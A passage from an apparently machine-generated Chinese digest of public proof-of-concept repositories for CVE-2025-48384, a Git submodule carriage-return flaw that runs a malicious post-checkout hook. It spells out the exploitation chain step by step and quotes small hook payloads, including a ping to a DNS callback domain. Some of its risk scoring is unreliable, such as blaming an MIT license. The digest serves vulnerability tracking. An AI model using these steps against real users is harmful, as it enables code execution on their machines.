根据 PoC 代码的逻辑和漏洞描述，该 PoC 代码是有效的。

**投毒风险分析：**

PoC 代码的目的是演示漏洞利用，其中包含的反向 shell 属于漏洞验证的一部分。但是，也存在潜在的投毒风险，比如在 `generate_poc.sh` 脚本中，作者可能会嵌入其他恶意代码，例如：

*   收集用户信息并发送到远程服务器。
*   修改系统文件。
*   安装恶意软件。

尽管PoC本身就是漏洞利用，但仍然存在被作者恶意利用的可能性，因此投毒风险评估为 10%。

**利用方式总结：**

1.  攻击者创建一个包含恶意子模块配置的 Git 仓库。
2.  攻击者诱使受害者克隆该仓库，并使用 `--recurse-submodules` 初始化子模块。
3.  Git 在处理包含尾随回车符的子模块路径时出现错误，导致子模块被检出到错误的位置。
4.  由于符号链接的存在，恶意 hook 被链接到子模块的 hooks 目录。
5.  在子模块初始化过程中，恶意 hook 被执行，导致任意代码执行。

**项目地址:** [nguyentranbaotran/cve-2025-48384-poc](https://github.com/nguyentranbaotran/cve-2025-48384-poc)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #26

**来源**: [CVE-2025-48384-replicatorbot_CVE-2025-48384.md](../2025/CVE-2025-48384-replicatorbot_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户检出包含恶意配置和submodule的仓库，且submodule包含恶意的post-checkout hook

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过构造包含恶意配置的Git仓库，实现在目标机器上执行任意代码。漏洞的根本原因是Git在处理配置文件中的换行符（CRLF）时存在缺陷。当Git读取配置值时，会去除尾部的CRLF，而当写入配置项时，如果值包含尾部CR，则不会进行引用，导致CR丢失。该漏洞利用方式如下：

1.  攻击者创建一个包含恶意配置的Git仓库，该配置会在submodule的路径中包含一个尾部的CR字符。
2.  攻击者创建一个submodule，并在submodule的`.git/hooks/post-checkout`文件中放置恶意脚本。
3.  攻击者创建一个指向恶意脚本的符号链接，该链接的目标路径经过CR处理后，会指向submodule的hooks目录。
4.  用户克隆包含恶意配置的仓库，并且递归初始化submodule，触发post-checkout钩子，执行恶意脚本，从而导致任意代码执行。

提供的POC代码是一个简单的`post-checkout`钩子脚本，它会在`/tmp`目录下创建一个名为`asp-was-here-cve-2025-48384`的文件。该脚本本身没有隐藏的投毒代码，只是用于验证漏洞是否成功利用。

根据搜索引擎的结果，该漏洞是真实存在的，并且有公开的PoC利用代码。多个安全厂商和社区都对此漏洞进行了分析和披露。

综合以上信息，可以得出结论：该漏洞利用是有效的，POC代码本身没有投毒风险，漏洞的利用方式是通过构造包含恶意配置和submodule的仓库，诱导用户克隆并初始化submodule，从而执行任意代码。

**项目地址:** [replicatorbot/CVE-2025-48384](https://github.com/replicatorbot/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #27

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git允许通过损坏的配置引用执行任意代码

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户克隆包含恶意配置的 Git 仓库，并递归初始化子模块。用户需要具有一定的权限，并且需要用户交互。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理包含回车符（CR）的配置值时存在不一致性。当读取配置值时，Git 会删除尾部的 CRLF。但是，当写入配置条目时，如果值包含尾部的 CR，则不会被正确引用，导致在后续读取配置时丢失 CR。当初始化子模块时，如果子模块的路径包含尾部的 CR，则修改后的路径将被读取，导致子模块被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
根据漏洞描述和搜索结果，此漏洞允许攻击者通过构造恶意 Git 仓库，在用户克隆仓库并初始化子模块时执行任意代码。提供的 POC 代码 `README.md` 仅包含基本的 Markdown 内容，本身不包含任何恶意代码或利用逻辑。但是，此`README.md`可能是一个更大 PoC 的一部分，用于展示漏洞仓库的结构。实际的利用需要构造包含带有恶意配置和 hook 的恶意仓库。

**投毒风险：**
提供的 POC 代码 `README.md` 文件本身没有投毒风险，但攻击者可能在其他文件中隐藏恶意代码，例如在 `.gitmodules` 文件或 submodule 的 post-checkout hook 中。如果攻击者修改了子模块的 hook 文件，并在其中添加了恶意代码，那么当用户克隆包含此子模块的仓库时，hook 脚本可能会被执行，从而导致任意代码执行。考虑到仅仅是一个`README.md`文件，其他的文件是否包含恶意代码，不得而知，无法完全排除风险。 投毒风险评估为10%。

**利用方式：**
1.  **创建恶意 Git 仓库：** 攻击者创建一个包含子模块的 Git 仓库。
2.  **修改 .gitmodules 文件：** 在 `.gitmodules` 文件中，将子模块的路径设置为包含尾部 CR 的路径。
3.  **创建符号链接：** 创建一个符号链接，将修改后的路径指向子模块的 `.git/hooks` 目录。
4.  **添加恶意 hook：** 在子模块的 `post-checkout` hook 中添加恶意代码。
5.  **诱导用户克隆仓库：** 诱导用户克隆恶意 Git 仓库并使用 `--recursive` 参数初始化子模块。
6.  **执行任意代码：** 当用户初始化子模块时，由于配置解析错误和符号链接的存在，恶意的 `post-checkout` hook 将被执行，从而导致任意代码执行。


**项目地址:** [s41r4j/CVE-2025-48384-submodule](https://github.com/s41r4j/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #28

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库，并执行包含submodule的操作，例如git submodule update --init --recursive

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是 Git 中一个高危漏洞，源于 Git 在处理配置文件时，对包含回车符 (CR) 的配置值的处理不一致。当 Git 读取配置值时，它会删除任何尾部的回车符和换行符 (CRLF)。但是，当写入配置条目时，如果值包含尾部的 CR，则不会被引用，导致在稍后读取配置时 CR 丢失。该漏洞利用方式为：

1.  **恶意仓库构建：** 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个 submodule 的路径，该路径以回车符结尾（例如，`submodule_path\r`）。
2.  **符号链接：** 攻击者在仓库中创建一个符号链接，将修改后的 submodule 路径（由于回车符被删除，变为 `submodule_path`）指向 `.git/hooks/post-checkout` 目录。
3.  **恶意钩子：** 攻击者在 submodule 中包含一个可执行的 `post-checkout` 钩子脚本，该脚本包含恶意代码。
4.  **诱导用户 clone：** 攻击者诱导受害者克隆该恶意仓库，并执行 `git submodule update --init --recursive` 命令。
5.  **代码执行：** 当执行 `git submodule update` 时，由于符号链接的存在，`post-checkout` 钩子脚本将被执行，从而导致任意代码执行。

**有效性评估：**
根据漏洞信息和搜索结果，该漏洞确实存在，并且有公开的 PoC。提供的 Dockerfile 用于构建存在漏洞的 Git 版本（2.47.2），从而创建一个可用于验证漏洞的环境。README.md 文件详细解释了该漏洞，佐证了漏洞的存在。因此，该PoC有效。

**投毒风险评估：**
Dockerfile 仅用于构建易受攻击的 Git 环境，LICENSE 文件采用 MIT 许可，较为宽松，存在一定的风险。README.md 只是漏洞说明。整体评估投毒风险较低，约为10%。风险主要来源于LICENSE协议。

**利用方式总结：**
利用该漏洞需要攻击者精心构造一个恶意 Git 仓库，并诱导受害者克隆和执行特定命令。攻击的复杂性在于需要理解 Git 的配置处理机制和钩子机制，并巧妙地利用符号链接来实现代码执行。攻击者需要利用git config的解析缺陷，在submodule路径后添加\r字符，使submodule被clone到错误的位置，并使用软链接，将错误位置链接到.git/hooks目录下，在post-checkout阶段执行恶意代码

**项目地址:** [s41r4j/CVE-2025-48384](https://github.com/s41r4j/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #29

**来源**: [CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md)

# CVE-2025-48384

> 📦 该CVE有 **35** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致系统被完全控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，并且执行带有漏洞的Git版本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置时对换行符（CRLF）处理不当。当初始化子模块时，如果子模块的路径包含尾随的CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
根据漏洞描述和PoC代码，该PoC是有效的。攻击者可以通过创建一个包含恶意配置的 Git 仓库，诱导用户克隆该仓库，从而触发漏洞并执行任意代码。

提供的PoC代码包含以下文件：
*   `README.md`: 简单的README文件，用于初始化子模块。
*   `post-checkout`: 一个shell脚本，用于执行任意命令，此处是`echo`和`id`命令。

**投毒风险：**
分析PoC代码，未发现作者隐藏的恶意代码。`post-checkout` 脚本的功能仅为打印 `id` 命令的执行结果，用于验证漏洞的存在。**因此，投毒风险为0%。**

**利用方式：**
1.  攻击者创建一个包含恶意配置的 Git 仓库。该仓库的子模块路径包含尾随CR字符。
2.  攻击者创建一个符号链接，将包含CR字符的子模块路径指向 `.git/hooks` 目录，或者子模块下的 `.git/hooks` 目录。
3.  攻击者将包含恶意代码的 `post-checkout` 脚本添加到子模块的 `.git/hooks` 目录中。
4.  攻击者诱导用户克隆该恶意 Git 仓库。
5.  当用户克隆仓库并初始化子模块时，由于Git对CR字符处理不当，子模块会被检出到错误的位置，同时 `post-checkout` 脚本会被执行，从而导致任意代码执行。

**项目地址:** [Anezatraa/CVE-2025-48384-submodule](https://github.com/Anezatraa/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #2

**来源**: [CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置时对回车符（CR）处理不当。攻击者可以构造包含恶意配置的 Git 仓库，其中子模块路径包含尾随 CR。当用户克隆该仓库并初始化子模块时，Git 会错误地将子模块检出到错误的位置。如果攻击者在错误的位置设置了一个指向子模块 hooks 目录的符号链接，并且子模块包含一个可执行的 post-checkout hook，那么在检出后，该 hook 脚本就会被执行，从而导致任意代码执行。

**POC分析：**

提供的 POC 代码 `/tmp/569f31ff6b5166501e6218f8839f5620/post-checkout` 是一个 post-checkout hook 脚本。该脚本的作用是 ping `wtt0rkb926c0mj6tsxmzfr2xlorff53u.test-burp.huidoumeng.com`。这个行为本身用于验证漏洞是否被成功利用，攻击者可以通过监测 DNS 请求判断 hook 是否被执行。这个hook仅是验证，不能算恶意代码。

**有效性：**

根据搜索结果，该漏洞的PoC已经公开，并被标记为高危漏洞，利用代码结合漏洞描述，可以判断POC有效。

**投毒风险：**

提供的POC代码仅包含一个简单的ping命令，用于验证漏洞是否触发。它本身不包含任何恶意代码或后门，因此投毒风险较低，可以认为是0%。然而，实际攻击中，攻击者可能会将此 hook 替换为更具破坏性的代码。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库。
2.  恶意配置包括带有尾随回车符的子模块路径。
3.  攻击者在错误的位置创建一个指向子模块 hooks 目录的符号链接。
4.  攻击者在子模块中包含一个可执行的 post-checkout hook。
5.  攻击者诱使用户克隆该恶意仓库并初始化子模块。
6.  用户执行 `git clone --recurse-submodules` 或 `git submodule update --init --recursive`。
7.  Git将子模块检出到错误的位置，并执行 post-checkout hook，从而导致任意代码执行。

**项目地址:** [ECHO6789/CVE-2025-48384-submodule](https://github.com/ECHO6789/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #3

**来源**: [CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md](../2025/CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md)

## CVE-2025-48384-Git代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置文件时的不一致性，具体来说，Git 在读取配置值时会移除尾部的回车符（CRLF），但在写入时，如果配置值以回车符结尾，则不会对其进行引用。这会导致在稍后读取配置时丢失回车符。

**漏洞利用方式：**

1.  **恶意仓库创建：** 攻击者创建一个恶意的 Git 仓库，其中包含一个`.gitmodules`文件，该文件定义了一个 submodule，其路径包含尾部回车符（CR）。例如：`path = submodule_path\r`。
2.  **符号链接：** 仓库中存在一个符号链接，指向修改后的 submodule 路径到`.git/hooks`目录。这样可以将看似无害的目录路径重定向到 Git 钩子目录。
3.  **恶意钩子：** 仓库中包含一个可执行的`post-checkout`钩子脚本，该脚本会在 checkout 操作后执行。
4.  **诱导用户：** 攻击者诱导受害者克隆（`git clone --recursive`）该恶意仓库。
5.  **代码执行：** 当受害者执行 `git clone --recursive` 时，Git 会尝试 checkout submodule 到错误路径。由于存在符号链接，实际checkout操作会将文件写入到 `.git/hooks` 目录。`post-checkout` 钩子脚本会被执行，从而导致任意代码执行。

**有效性：**
提供的 Python 脚本 `cve_2025_48384_auto_print_scanner.py` 是一个扫描器，用于检测本地或远程 Git 仓库是否存在 CVE-2025-48384 漏洞的潜在利用。它会检查`.gitmodules`文件中是否存在包含尾部回车符或`..`的路径，查找指向`.git/hooks`的符号链接，并列出可执行的钩子脚本，并显示钩子脚本内容。虽然该脚本本身不能直接利用该漏洞，但可以帮助安全研究人员或用户识别潜在的恶意仓库。结合搜索结果，可以确认此漏洞存在可利用性。

**投毒风险：**
代码本身是一个扫描工具，旨在帮助用户识别潜在的漏洞。它没有发现任何主动植入后门或恶意代码的行为。因此，可以认为该代码本身不存在投毒风险。我评估投毒风险为0%。该脚本的目的是分析给定的 Git 仓库，而不是执行任何恶意操作，所以不应该存在投毒代码。

**项目地址:** [EdwardYeIntrix/CVE-2025-48384-Scanner](https://github.com/EdwardYeIntrix/CVE-2025-48384-Scanner)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #4

**来源**: [CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md](../2025/CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置解析漏洞导致任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库并且执行`git submodule update --init --recursive`，用户需要交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于Git在解析配置文件时对换行符处理不当。具体来说，Git在读取配置值时会去除结尾的回车符和换行符（CRLF）。但在写入配置时，如果值以回车符结尾，则不会被正确引用，导致回车符丢失。利用该漏洞，攻击者可以精心构造包含恶意配置的Git仓库，当用户克隆并初始化子模块时，子模块路径中的回车符会被错误解析，导致子模块被检出到错误的位置。如果此时存在一个指向子模块钩子目录的符号链接，并且该子模块包含一个可执行的 post-checkout 钩子，则该脚本可能会在检出后被意外执行，从而导致任意代码执行。

提供的POC代码是一个简单的恶意post-checkout钩子脚本，其功能是在被执行时输出 "Malicious hook executed!"。该脚本本身并没有隐藏任何额外的投毒代码，它的目的是验证漏洞是否成功利用，而不是进行实际的恶意攻击。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`配置文件的Git仓库。该配置文件中的子模块路径包含一个尾部的回车符。
2.  攻击者在仓库中创建一个符号链接，将错误解析后的子模块路径链接到`.git/modules/<submodule_name>/hooks`目录。
3.  攻击者在子模块中创建一个名为`post-checkout`的可执行钩子脚本。这个脚本包含攻击者想要执行的恶意代码。
4.  攻击者将仓库共享给受害者。
5.  受害者克隆该仓库并执行`git submodule update --init --recursive`命令。
6.  由于配置解析错误，子模块会被检出到错误的位置。
7.  符号链接会将对错误位置的访问重定向到子模块的钩子目录。
8.  `post-checkout`钩子脚本被执行，导致任意代码执行。

**项目地址:** [MarcoTondolo/cve-2025-48384-poc](https://github.com/MarcoTondolo/cve-2025-48384-poc)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #5

**来源**: [CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md](../2025/CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md)

## CVE-2025-48384-Git配置引号处理缺陷导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致系统被完全控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库，并初始化包含恶意配置的子模块，且子模块包含恶意的post-checkout hook。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理配置引号时存在缺陷。当读取配置值时，Git会删除任何尾部的回车符和换行符（CRLF）。当写入配置项时，尾部带有CR的值不会被引用，导致CR在稍后读取配置时丢失。当初始化子模块时，如果子模块路径包含尾部CR，则会读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会意外执行该脚本。

根据提供的POC代码，`/tmp/81a81d657749821214a4f9bba7b4c2c8/post`文件是一个简单的bash脚本，其功能是在`/tmp`目录下创建一个名为`CVE-2025-48384`的空文件。这个脚本本身不包含明显的恶意代码，但如果利用该漏洞，它可以被放置到`.git/hooks/post-checkout`中，在`git checkout`命令执行后自动执行。这使得攻击者可以控制受害者的系统。

**利用方式：**
1.  攻击者创建一个包含恶意配置的Git仓库。恶意配置包含一个包含尾部CR的子模块路径，该路径指向子模块的hooks目录。
2.  攻击者在该仓库中添加一个可执行的`post-checkout` hook脚本 (例如，提供的`post`脚本)到子模块的hooks目录中。
3.  攻击者诱导受害者克隆该恶意仓库并初始化子模块。
4.  由于Git的配置引号处理缺陷，子模块会被检出到错误的位置，符号链接会将该位置指向子模块的hooks目录。
5.  当受害者执行`git checkout`命令时，`post-checkout` hook脚本会被执行，攻击者从而实现任意代码执行。

**有效性：**
提供的POC代码是有效的，因为它展示了如何创建一个触发漏洞的`post-checkout` hook脚本。尽管脚本本身的功能很简单，但可以替换为任何恶意代码。

**投毒风险：**
该仓库中存在作者隐藏的投毒代码的风险较低，估计为10%。当前提供的脚本只是一个简单的测试脚本，用于验证漏洞的存在。但是，攻击者可能会在更复杂的仓库中隐藏更高级的恶意代码，使其更难被检测到。该风险评估基于提供的信息，实际风险可能因仓库的具体内容而有所不同。

**项目地址:** [admin-ping/CVE-2025-48384-RCE](https://github.com/admin-ping/CVE-2025-48384-RCE)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #6

**来源**: [CVE-2025-48384-airkewld_cve-2025-48384-submodule.md](../2025/CVE-2025-48384-airkewld_cve-2025-48384-submodule.md)

## CVE-2025-48384-Git配置注入与RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的Git仓库，且安装的Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于Git在处理配置文件时的不一致性，具体来说，是Git在读取和写入包含控制字符（如回车符CR）的配置值时的方式存在差异。当初始化子模块时，如果子模块路径包含尾随CR，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将修改后的路径指向子模块钩子目录，并且子模块包含一个可执行的post-checkout钩子，则该脚本可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**

根据提供的漏洞利用代码，`post-checkout` 文件包含 shell 命令 `echo "RCE"` 和 `touch /tmp/rce.txt`。 该 POC 通过在恶意 Git 仓库中设置恶意的 `post-checkout` 钩子，当存在漏洞的 Git 客户端克隆包含该恶意仓库并递归初始化子模块时，就会触发该钩子，从而在目标系统上执行任意命令，验证 POC 的有效性。

**投毒风险分析：**

在提供的POC代码中，`README.md` 文件主要用于描述仓库，本身不包含恶意代码。`post-checkout` 文件中包含 `echo` 和 `touch` 命令，用于验证 RCE 是否成功。虽然这两个命令本身没有危害，但如果攻击者在 `post-checkout` 脚本中添加更复杂的恶意代码（例如下载并执行其他恶意程序），则可能存在投毒风险。评估当前代码，投毒风险较低，初步估计为10%。

**利用方式：**

1.  攻击者创建一个包含恶意配置和子模块的Git仓库。
2.  恶意配置包含带有尾随CR的子模块路径，该路径被符号链接指向`.git/hooks`目录。
3.  子模块包含一个名为 `post-checkout` 的可执行钩子，其中包含要执行的恶意代码。
4.  攻击者诱使用户克隆并递归初始化该仓库（例如，使用`git clone --recursive`）。
5.  当 Git 处理子模块时，由于配置处理的缺陷，恶意 `post-checkout` 钩子会被触发，导致在用户计算机上执行任意代码。

**优先级依据：**

在漏洞分析过程中，搜索引擎结果提供了漏洞的概况、影响、利用情况等信息，有助于全面了解漏洞。漏洞利用代码提供了直接的利用方法，有助于验证漏洞的有效性并深入理解漏洞原理。漏洞库信息提供了漏洞的官方描述和修复方案，有助于确认漏洞的存在和修复方法。综合考虑这些信息来源，可以更准确地评估漏洞的风险和利用方式。

**项目地址:** [airkewld/cve-2025-48384-submodule](https://github.com/airkewld/cve-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #7

**来源**: [CVE-2025-48384-altm4n_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-altm4n_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，并使用受影响的Git版本

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置值时，会去除尾部的回车换行符 (CRLF)。当写入配置条目时，如果值包含尾部的回车符 (CR)，则不会进行引号转义，导致在后续读取配置时丢失回车符。如果初始化子模块时，子模块路径包含尾部的回车符，则读取到的路径会被修改，导致子模块被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向子模块的 hooks 目录，并且子模块包含可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
提供的 POC 代码 `touch /tmp/xxxxxxx` 会在 `/tmp` 目录下创建一个名为 `xxxxxxx` 的文件。结合漏洞描述，这个 POC 代码本身并不能直接证明漏洞的存在，而是在攻击链中扮演了 *post-checkout* 钩子的角色，用于验证恶意配置是否能被执行。根据页面[5]（`https://dgl.cx/2025/07/git-clone-submodule-cve-2025-48384`）的信息，此漏洞涉及到使用`git clone --recursive`克隆包含恶意子模块的仓库，可以触发RCE。

**投毒风险：**
给定的 POC 代码非常简单，仅创建一个文件，没有发现隐藏的恶意代码。因此，投毒风险为 0%。这个脚本的目的是验证 post-checkout 钩子是否被触发，而不是执行恶意操作。但是如果恶意攻击者控制了git仓库，可以植入任意的post-checkout脚本实现远端代码执行.

**利用方式：**
1.  **创建恶意仓库：** 攻击者创建一个包含恶意配置的 Git 仓库。这个恶意配置包括一个带有尾部回车符的子模块路径，以及一个指向子模块 hooks 目录的符号链接。
2.  **添加恶意钩子：** 在子模块的 hooks 目录中，攻击者添加一个可执行的 post-checkout 钩子。这个钩子可以执行任意代码。
3.  **诱导用户克隆：** 攻击者诱导用户使用受影响的 Git 版本克隆这个恶意仓库，使用 `git clone --recursive` 命令递归克隆子模块。
4.  **触发漏洞：** 当 Git 初始化子模块时，由于配置处理的缺陷，子模块会被检出到错误的位置，触发符号链接，最终导致恶意 post-checkout 钩子被执行，实现任意代码执行。

**总结：**
此漏洞利用依赖于特定的 Git 配置和用户交互（克隆恶意仓库），攻击复杂度较高，但一旦成功利用，危害极大，可能导致服务器被完全控制。

**项目地址:** [altm4n/CVE-2025-48384-sub](https://github.com/altm4n/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #8

**来源**: [CVE-2025-48384-altm4n_cve-2025-48384-hub.md](../2025/CVE-2025-48384-altm4n_cve-2025-48384-hub.md)

## CVE-2025-48384-Git配置注入/代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/代码执行

**影响应用:** Git

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库,并执行含有 post-checkout hook的submodule 初始化

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

